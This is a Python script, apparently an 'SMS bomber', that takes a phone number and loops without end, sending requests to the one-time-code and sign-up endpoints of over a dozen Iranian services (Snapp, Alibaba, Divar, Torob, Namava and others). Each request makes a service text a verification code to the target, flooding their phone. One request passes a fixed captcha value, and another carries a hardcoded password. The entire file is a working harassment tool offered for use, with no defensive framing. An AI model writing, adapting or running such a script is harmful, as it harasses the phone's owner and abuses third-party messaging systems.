import requests, sys

if len(sys.argv) != 2:
    print("data not val, help: \npython3 sms.py (Phone Number)")
    sys.exit()
else:
    phone = sys.argv[1].strip()
    phone_shad = '98' + phone[1:]
    phone2 = '+98' + phone[1:]
    try:
        while True:
            try:
                hamyarzaban_data = {'phone':phone}
                hamyarzaban = requests.post("https://hamyarzaban.com/wp-content/themes/hamyarzaban/sms.php")
                print(f"ham status: {hamyarzaban}")
            except:
                print("ham not")
            try:
                snaptrip_data = {"lang":"fa","country_id":"860","password":"fhj5tvT6D9jWkPw","mobile_phone":phone,"country_code":"+98"}
                snaptrip = requests.post("https://www.snapptrip.com/register", json=snaptrip_data)
                print(f"snap trip status: {snaptrip}")
            except:
                print("snap trip not")
            try:
                alibaba_data = {"phoneNumber":phone}
                alibaba = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=alibaba_data)
                print(f"alibaba status: {alibaba}")
            except:
                print("alibaba not")
            try:
                data_snap_food = {'cellphone':phone,'captcha':'111'}
                snap_food = requests.post("https://snappfood.ir/auth/login_with_no_pass", data=data_snap_food)
                print(f"snapfood status: {snap_food}")
            except:
                print("snap food not")
            try:
                data_snap = {"type":2,"phone":phone}
                snap = requests.post("https://api.snapp.ir/api/v1/sms/link", data=data_snap)
                print(f"snap status: {snap}")
            except:
                print("snap not")
            try:
                data_shad = {"api_version":"3","method":"sendCode","data":{"phone_number":phone_shad,"send_type":"SMS"}}
                shad = requests.post("https://shadmessenger103.iranlms.ir/", json=data_shad)
                print(f"shad status: {shad}")
            except:
                print("shad not")
            try:
                data_tp30 = {"credential":{"phoneNumber":phone,"role":"PASSENGER"}}
                tp30 = requests.post("https://tap33.me/api/v2/user", json=data_tp30)
                print(f"tp30 status: {tp30}")
            except:
                print("tp30 not")
            try:
                devar_data = {"phone":phone}
                devar = requests.post("https://api.divar.ir/v5/auth/authenticate", json=devar_data)
                print(f"devar status: {devar}")
            except:
                print("devar not")
            try:
                data_snapfood2 = {'cellphone':phone}
                snapfood2 = requests.post("https://snappfood.ir/customer/app-dl/send", data=data_snapfood2)
                print(f"snap food 2 status: {snapfood2}")
            except:
                print("snap food 2 not")
            try:
                data_lenz = {"msisdn":str(phone_shad)}
                lenz = requests.post('https://app.lenz.ir:64014/api/v2/auth/register/otp/generate', json=data_lenz)
                print(f'lenz status {lenz}')
            except:
                print('lenz not')
            try:
                data_namavi = {"UserName":phone2}
                namavi = requests.post('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', json=data_namavi)
                print(f'namavi status {namavi}')
            except:
                print('namavi not')
            try:
                data_rubaki = {"api_version":"3","method":"sendCode","data":{"phone_number":phone_shad,"send_type":"SMS"}}
                rubaki = requests.post('https://messengerg2c53.iranlms.ir/', json=data_rubaki)
                print(f'rubaki status {rubaki}')
            except:
                print("rubaki not")
            try:
                trob = requests.get('https://api.torob.com/a/phone/send-pin/?phone_number=' + phone)
                print(f'trob status {trob}')
            except:
                print("trob not")
                
    except:
        pass
